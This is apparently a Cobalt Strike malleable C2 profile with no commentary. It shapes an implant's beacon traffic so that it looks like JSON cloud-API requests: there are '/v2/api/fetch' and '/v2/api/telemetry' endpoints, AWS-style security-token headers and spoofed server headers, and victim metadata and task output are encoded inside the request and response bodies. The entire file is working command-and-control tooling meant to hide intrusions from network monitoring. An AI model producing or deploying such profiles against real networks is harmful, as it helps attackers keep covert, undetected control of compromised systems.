set sleeptime "5000";
set jitter    "0";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-config {
    set trust_x_forwarded_for "true";
}

http-get {
    set uri "/v2/api/fetch";
    client {
        metadata {
            base64url;
            netbios;
            base64url;
            parameter "token";
        }
        header "x-amz-security-token" "[REPLACE-WITH-GUARDRAIL-TOKEN]";
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";

        output {
            base64;
            prepend "{\"version\":\"2\",\"count\":\"1\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

http-post {
    set uri "/v2/api/telemetry";
    set verb "POST";

    client {
        parameter "action" "GetExtensibilityContext";
        header "Content-Type" "application/json; charset=utf-8";
        header "Pragma" "no-cache";
        header "x-amz-security-token" "[REPLACE-WITH-GUARDRAIL-TOKEN]";

        id {
            parameter "token";
        }

        output {
            mask;
            base64;
            prepend "{\"version\":\"2\",\"report\":\"";
            append "\"}";
            print;
        }
    }

    server {
        header "api-supported-versions" "2";
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
        header "x-beserver" "XPN0LR10CA0006";

        output {
            base64url;
            prepend "{\"version\":\"2\",\"count\":\"1\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}
